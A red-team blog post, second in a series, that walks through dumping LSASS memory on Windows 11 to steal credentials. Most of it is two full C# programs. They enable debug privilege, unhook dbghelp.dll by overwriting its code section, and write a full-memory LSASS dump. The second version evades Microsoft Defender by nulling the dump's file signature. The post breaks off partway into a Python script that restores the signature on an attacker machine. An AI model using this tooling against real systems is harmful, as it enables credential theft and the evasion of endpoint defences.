---
title: "Dumping LSASS on Windows 11 - Part2"
layout: "post"
categories: "Windows"
tags: ["Red Team"]
---

Hey everyone,

Today I'm going to be finishing the blog on dumping LSASS on Windows 11. To kick things off, I will start where we left off, which is developing a .NET assembly to dump LSASS and pairing it with the previously developed In-Process Patchless AMSI Bypass PowerShell script.

I will be using this GitHub repository as the base code but transforming the C++ into C#: [https://github.com/peiga/DumpThatLSASS/tree/main](https://github.com/peiga/DumpThatLSASS/tree/main). The code performs API unhooking of the MiniDumpWriteDump function by getting a fresh copy of DbgHelp.dll from disk. It then copies the .text section of the unhooked and clean DbgHelp.dll to overwrite the .text section of the loaded DbgHelp.dll, effectively overwriting and unhooking any hooks that were placed on MiniDumpWriteDump or other functions in the DLL.

In the original implementation, the author used string obfuscation, which is a good technique and a common baseline for malware tools. Although I didn't add it for my blog, I do recommend it for modern EDRs along with many other techniques I will highlight in a future EDR blog.

As mentioned in part 1 of this blog, Defender doesn't flag the dumping of LSASS, but it does flag when the content is written to disk. We saw that with the Golang code that sent the dump to a remote machine via an anonymous pipe. Defender never flagged during the operation, even though the code wasn't obfuscated or encrypted. In my debugging with a .NET assembly, I observed the same behavior.

In my implementation below, I dump LSASS to a file on disk called test.txt. After closing the handle to write to the file, I read in all the bytes from the file and then XOR them by a key of 0xFF. I have provided the code below.



``` cs

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

class Program
{

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("dbghelp.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, uint DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);
	
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, UIntPtr dwNumberOfBytesToMap);


    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    public enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin,
        TokenElevationType,
        TokenLinkedToken,
        TokenElevation,
        TokenHasRestrictions,
        TokenAccessInformation,
        TokenVirtualizationAllowed,
        TokenVirtualizationEnabled,
        TokenIntegrityLevel,
        TokenUIAccess,
        TokenMandatoryPolicy,
        TokenLogonSid
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_ELEVATION
    {
        public int TokenIsElevated;
    }
	
	 [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER
    {
        public ushort e_magic;
        public ushort e_cblp;
        public ushort e_cp;
        public ushort e_crlc;
        public ushort e_cparhdr;
        public ushort e_minalloc;
        public ushort e_maxalloc;
        public ushort e_ss;
        public ushort e_sp;
        public ushort e_csum;
        public ushort e_ip;
        public ushort e_cs;
        public ushort e_lfarlc;
        public ushort e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public ushort[] e_res1;
        public ushort e_oemid;
        public ushort e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public ushort[] e_res2;
        public int e_lfanew;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS
    {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER
    {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public uint BaseOfData;
        public uint ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public uint SizeOfStackReserve;
        public uint SizeOfStackCommit;
        public uint SizeOfHeapReserve;
        public uint SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DATA_DIRECTORY
    {
        public uint VirtualAddress;
        public uint Size;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] Name;
        public uint Misc;
        public uint VirtualAddress;
        public uint SizeOfRawData;
        public uint PointerToRawData;
        public uint PointerToRelocations;
        public uint PointerToLinenumbers;
        public ushort NumberOfRelocations;
        public ushort NumberOfLinenumbers;
        public uint Characteristics;
    }

    const uint TOKEN_QUERY = 0x0008;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
	const uint GENERIC_READ = 0x80000000;
    const uint FILE_SHARE_READ = 0x00000001;
    const uint OPEN_EXISTING = 3;
    const uint PAGE_READONLY = 0x02;
    const uint SEC_IMAGE = 0x1000000;
    const uint FILE_MAP_READ = 0x0004;

    static void Main()
    {
        int pid = 0;

        foreach (Process proc in Process.GetProcesses())
        {
            string prefix = "ls";
            string suffix = "ass";
            string serviceName = prefix + suffix;

            if (proc.ProcessName == serviceName)
            {
                pid = proc.Id;
                Console.WriteLine("[+] The Process PID: " + pid);
                break;
            }
        }

        if (!IsElevated())
        {
            Console.WriteLine("Not admin");
            return;
        }
        if (!SetDebugPrivilege())
        {
            Console.WriteLine("No SeDebugPrivilege");
            return;
        }

        FreshCopyDbghelp();

        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("Failed in OpenProcess");
            return;
        }

        pd(hProcess, (uint)pid);
        CloseHandle(hProcess);
    }

    static bool IsElevated()
    {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_QUERY, out hToken))
        {
            return false;
        }

        TOKEN_ELEVATION elevation = new TOKEN_ELEVATION();
        int size = Marshal.SizeOf(elevation);
        IntPtr elevationPtr = Marshal.AllocHGlobal(size);
        Marshal.StructureToPtr(elevation, elevationPtr, false);

        uint returnedSize;
        bool success = GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, elevationPtr, (uint)size, out returnedSize);
        if (!success)
        {
            CloseHandle(hToken);
            return false;
        }

        elevation = (TOKEN_ELEVATION)Marshal.PtrToStructure(elevationPtr, typeof(TOKEN_ELEVATION));
        Marshal.FreeHGlobal(elevationPtr);
        CloseHandle(hToken);

        return elevation.TokenIsElevated != 0;
    }

    static bool SetDebugPrivilege()
    {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
        {
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
        {
            CloseHandle(hToken);
            Console.WriteLine("I don't have SeDebugPrivilege");
            return false;
        }

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
        {
            PrivilegeCount = 1,
            Privileges = new LUID_AND_ATTRIBUTES[1]
        };
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
        {
            CloseHandle(hToken);
            Console.WriteLine("Could not adjust to SeDebugPrivilege");
            return false;
        }

        CloseHandle(hToken);
        return true;
    }


    static void FreshCopyDbghelp()
    {
        string dbghelpPath = @"C:\Windows\System32\dbghelp.dll";
        IntPtr hFile = CreateFile(dbghelpPath, GENERIC_READ, FILE_SHARE_READ, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
        if (hFile == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open dbghelp.dll");
            return;
        }

        IntPtr hFileMapping = CreateFileMapping(hFile, IntPtr.Zero, PAGE_READONLY | SEC_IMAGE, 0, 0, null);
        if (hFileMapping == IntPtr.Zero)
        {
            Console.WriteLine("Failed in CreateFileMapping");
            CloseHandle(hFile);
            return;
        }

        IntPtr pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, UIntPtr.Zero);
        if (pMapping == IntPtr.Zero)
        {
            int errorCode = Marshal.GetLastWin32Error();
            Console.WriteLine("Failed in MapViewOfFile. Error code: " + errorCode);
            CloseHandle(hFileMapping);
            CloseHandle(hFile);
            return;
        }

        IntPtr hDbghelp = GetModuleHandle("dbghelp.dll");
        IntPtr pDosHeader = pMapping;
        IMAGE_DOS_HEADER idh = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(pDosHeader, typeof(IMAGE_DOS_HEADER));
        IntPtr pNtHeaders = IntPtr.Add(pDosHeader, idh.e_lfanew);
        IMAGE_NT_HEADERS inh = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(pNtHeaders, typeof(IMAGE_NT_HEADERS));

        for (int i = 0; i < inh.FileHeader.NumberOfSections; i++)
        {
            IntPtr pishPtr = IntPtr.Add(pNtHeaders, Marshal.SizeOf(inh) + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))));
            IMAGE_SECTION_HEADER pish = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pishPtr, typeof(IMAGE_SECTION_HEADER));

            if (Encoding.UTF8.GetString(pish.Name).TrimEnd('\0') == ".text")
            {
                IntPtr textSection = IntPtr.Add(hDbghelp, (int)pish.VirtualAddress);
                uint oldProtect;
                if (!VirtualProtect(textSection, new UIntPtr(pish.Misc), 0x40, out oldProtect))
                {
                    return;
                }

                for (int j = 0; j < pish.Misc; j++)
                {
                    Marshal.WriteByte(textSection, j, Marshal.ReadByte(IntPtr.Add(pMapping, (int)pish.PointerToRawData + j)));
                }

                VirtualProtect(textSection, new UIntPtr(pish.Misc), oldProtect, out oldProtect);
            }
        }

        CloseHandle(hFileMapping);
        CloseHandle(hFile);
    }

    static void pd(IntPtr hProcess, uint pid)
	{
		string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string outputPath = Path.Combine(desktopPath, "test.txt");
        Console.WriteLine("Output Path: " + outputPath);
		IntPtr hFile = CreateFile(outputPath, 0x40000000, 0, IntPtr.Zero, 2, 0, IntPtr.Zero);
		if (hFile == IntPtr.Zero)
		{
			Console.WriteLine("Failed to create dump file");
			return;
		}

		if (!MiniDumpWriteDump(hProcess, pid, hFile, 0x00000002, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
		{
			Console.WriteLine("Failed to write dump");
			CloseHandle(hFile);
			return;
		}

		Console.WriteLine("Dump successfully written to: " + outputPath);

		CloseHandle(hFile);

		byte[] dumpData = File.ReadAllBytes(outputPath);

		for (int i = 0; i < dumpData.Length; i++)
		{
			dumpData[i] ^= 0xFF;
		}

		File.WriteAllBytes(outputPath, dumpData);

		Console.WriteLine("Dump XORed and written back to: " + outputPath);
	}

}

```

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\test.cs                           
```

![](/assets/posts/2024-06-03-LSASS-Dumping-Windows11-Part2/defender_caught_lsass_write.bmp)


We see after executing the code that Defender flags the writing of LSASS content to disk before we are able to overwrite the contents of test.txt with the XORed version. This indicates that Defender has the capability to quickly analyze files and determine their malicious nature. But how is it able to determine so quickly that the file is malicious?

To better understand this, I performed a dump without Defender enabled and then transferred test.txt to my Kali box. I then used the command below to analyze the file. 

```bash
xxd -l 256 lsass.dmp
```

![](/assets/posts/2024-06-03-LSASS-Dumping-Windows11-Part2/mdmp_signature.bmp)

When analyzing the dump, we see that the file type at the beginning is MDMP (Windows MiniDump). This is how Windows quickly analyzed the file: it grabbed the file type and then analyzed enough to see it was LSASS content. So, their detection is purely signature-based, which is a common flaw of most security solutions. To bypass this, I will perform the dump on a temporary file, then quickly overwrite the first 4 bytes of the file, which is the file type, with null bytes. Let's see if Defender flags the file after these changes. I have provided the updated code below.



```cs 

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.IO.MemoryMappedFiles;


class Program
{

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);
	
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, UIntPtr dwNumberOfBytesToMap);

	[DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    public enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin,
        TokenElevationType,
        TokenLinkedToken,
        TokenElevation,
        TokenHasRestrictions,
        TokenAccessInformation,
        TokenVirtualizationAllowed,
        TokenVirtualizationEnabled,
        TokenIntegrityLevel,
        TokenUIAccess,
        TokenMandatoryPolicy,
        TokenLogonSid
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_ELEVATION
    {
        public int TokenIsElevated;
    }
	
	 [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER
    {
        public ushort e_magic;
        public ushort e_cblp;
        public ushort e_cp;
        public ushort e_crlc;
        public ushort e_cparhdr;
        public ushort e_minalloc;
        public ushort e_maxalloc;
        public ushort e_ss;
        public ushort e_sp;
        public ushort e_csum;
        public ushort e_ip;
        public ushort e_cs;
        public ushort e_lfarlc;
        public ushort e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public ushort[] e_res1;
        public ushort e_oemid;
        public ushort e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public ushort[] e_res2;
        public int e_lfanew;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS
    {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER
    {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public uint BaseOfData;
        public uint ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public uint SizeOfStackReserve;
        public uint SizeOfStackCommit;
        public uint SizeOfHeapReserve;
        public uint SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DATA_DIRECTORY
    {
        public uint VirtualAddress;
        public uint Size;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] Name;
        public uint Misc;
        public uint VirtualAddress;
        public uint SizeOfRawData;
        public uint PointerToRawData;
        public uint PointerToRelocations;
        public uint PointerToLinenumbers;
        public ushort NumberOfRelocations;
        public ushort NumberOfLinenumbers;
        public uint Characteristics;
    }

    const uint TOKEN_QUERY = 0x0008;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
	const uint GENERIC_READ = 0x80000000;
    const uint FILE_SHARE_READ = 0x00000001;
    const uint OPEN_EXISTING = 3;
    const uint PAGE_READONLY = 0x02;
    const uint SEC_IMAGE = 0x1000000;
    const uint FILE_MAP_READ = 0x0004;

    static void Main()
    {
        int pid = 0;

        foreach (Process proc in Process.GetProcesses())
        {
            string prefix = "ls";
            string suffix = "ass";
            string serviceName = prefix + suffix;

            if (proc.ProcessName == serviceName)
            {
                pid = proc.Id;
                Console.WriteLine("[+] The Process PID: " + pid);
                break;
            }
        }

        if (!IsElevated())
        {
            Console.WriteLine("Not admin");
            return;
        }
        if (!SetDebugPrivilege())
        {
            Console.WriteLine("No SeDebugPrivilege");
            return;
        }

        FreshCopyDbghelp();

        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("Failed in OpenProcess");
            return;
        }

        pd(hProcess, (uint)pid);
        CloseHandle(hProcess);
    }

    static bool IsElevated()
    {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_QUERY, out hToken))
        {
            return false;
        }

        TOKEN_ELEVATION elevation = new TOKEN_ELEVATION();
        int size = Marshal.SizeOf(elevation);
        IntPtr elevationPtr = Marshal.AllocHGlobal(size);
        Marshal.StructureToPtr(elevation, elevationPtr, false);

        uint returnedSize;
        bool success = GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, elevationPtr, (uint)size, out returnedSize);
        if (!success)
        {
            CloseHandle(hToken);
            return false;
        }

        elevation = (TOKEN_ELEVATION)Marshal.PtrToStructure(elevationPtr, typeof(TOKEN_ELEVATION));
        Marshal.FreeHGlobal(elevationPtr);
        CloseHandle(hToken);

        return elevation.TokenIsElevated != 0;
    }

    static bool SetDebugPrivilege()
    {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
        {
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
        {
            CloseHandle(hToken);
            Console.WriteLine("I don't have SeDebugPrivilege");
            return false;
        }

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
        {
            PrivilegeCount = 1,
            Privileges = new LUID_AND_ATTRIBUTES[1]
        };
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
        {
            CloseHandle(hToken);
            Console.WriteLine("Could not adjust to SeDebugPrivilege");
            return false;
        }

        CloseHandle(hToken);
        return true;
    }


    static void FreshCopyDbghelp()
    {
        string dbghelpPath = @"C:\Windows\System32\dbghelp.dll";
        IntPtr hFile = CreateFile(dbghelpPath, GENERIC_READ, FILE_SHARE_READ, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
        if (hFile == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open dbghelp.dll");
            return;
        }

        IntPtr hFileMapping = CreateFileMapping(hFile, IntPtr.Zero, PAGE_READONLY | SEC_IMAGE, 0, 0, null);
        if (hFileMapping == IntPtr.Zero)
        {
            Console.WriteLine("Failed in CreateFileMapping");
            CloseHandle(hFile);
            return;
        }

        IntPtr pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, UIntPtr.Zero);
        if (pMapping == IntPtr.Zero)
        {
            int errorCode = Marshal.GetLastWin32Error();
            Console.WriteLine("Failed in MapViewOfFile. Error code: " + errorCode);
            CloseHandle(hFileMapping);
            CloseHandle(hFile);
            return;
        }

        IntPtr hDbghelp = GetModuleHandle("dbghelp.dll");
        IntPtr pDosHeader = pMapping;
        IMAGE_DOS_HEADER idh = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(pDosHeader, typeof(IMAGE_DOS_HEADER));
        IntPtr pNtHeaders = IntPtr.Add(pDosHeader, idh.e_lfanew);
        IMAGE_NT_HEADERS inh = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(pNtHeaders, typeof(IMAGE_NT_HEADERS));

        for (int i = 0; i < inh.FileHeader.NumberOfSections; i++)
        {
            IntPtr pishPtr = IntPtr.Add(pNtHeaders, Marshal.SizeOf(inh) + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))));
            IMAGE_SECTION_HEADER pish = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pishPtr, typeof(IMAGE_SECTION_HEADER));

            if (Encoding.UTF8.GetString(pish.Name).TrimEnd('\0') == ".text")
            {
                IntPtr textSection = IntPtr.Add(hDbghelp, (int)pish.VirtualAddress);
                uint oldProtect;
                if (!VirtualProtect(textSection, new UIntPtr(pish.Misc), 0x40, out oldProtect))
                {
                    return;
                }

                for (int j = 0; j < pish.Misc; j++)
                {
                    Marshal.WriteByte(textSection, j, Marshal.ReadByte(IntPtr.Add(pMapping, (int)pish.PointerToRawData + j)));
                }

                VirtualProtect(textSection, new UIntPtr(pish.Misc), oldProtect, out oldProtect);
            }
        }

        CloseHandle(hFileMapping);
        CloseHandle(hFile);
    }

	
	[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);


    [DllImport("dbghelp.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, uint DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

    static void pd(IntPtr hProcess, uint pid)
    {
        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string outputPath = Path.Combine(desktopPath, "test.txt");
        Console.WriteLine("Output Path: " + outputPath);

        string tempPath = Path.GetTempFileName(); 

        IntPtr hTempFile = CreateFile(tempPath, 0x40000000, 0, IntPtr.Zero, 2, 0, IntPtr.Zero);
        if (hTempFile == IntPtr.Zero)
        {
            Console.WriteLine("Failed to create temporary file");
            return;
        }

        if (!MiniDumpWriteDump(hProcess, pid, hTempFile, 0x00000002, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero)) // MiniDumpWithFullMemory
        {
            Console.WriteLine("Failed to write dump");
            CloseHandle(hTempFile);
            return;
        }

        CloseHandle(hTempFile);

        // Overwrite the first 4 bytes of the temporary file with null bytes
        using (FileStream fs = new FileStream(tempPath, FileMode.Open, FileAccess.Write))
        {
            fs.Seek(0, SeekOrigin.Begin);
            fs.WriteByte(0x00);
            fs.WriteByte(0x00);
            fs.WriteByte(0x00);
            fs.WriteByte(0x00);
        }

        // Delete the existing file if exists
        File.Delete(outputPath); 

         // Rename the temporary file to the desired file name
        File.Move(tempPath, outputPath);

        Console.WriteLine("Dump successfully written to: " + outputPath);
    }

}
```

![](/assets/posts/2024-06-03-LSASS-Dumping-Windows11-Part2/bypassed_defender_lsass_write.bmp)

After running the updated code, we observe that Defender no longer flags the file when it is written to disk. We can then transfer this file back to our Kali machine and use a Python script to restore the first 4 bytes, thereby reestablishing the correct LSASS dump. Below, I have provided the Python script that restores the MDMP file signature to test.txt.

```py

import argparse

def replace_first_four_bytes(input_file_path, output_file_path, new_bytes):
    # Ensure new_bytes is exactly 4 bytes long
    if len(new_bytes) != 4:
        raise ValueError("new_bytes must be exactly 4 bytes long")
    
    with open(input_file_path, 'rb') as input_file:
        data = input_file.read()

    # Replace the first four bytes
    modified_data = new_bytes + data[4:]

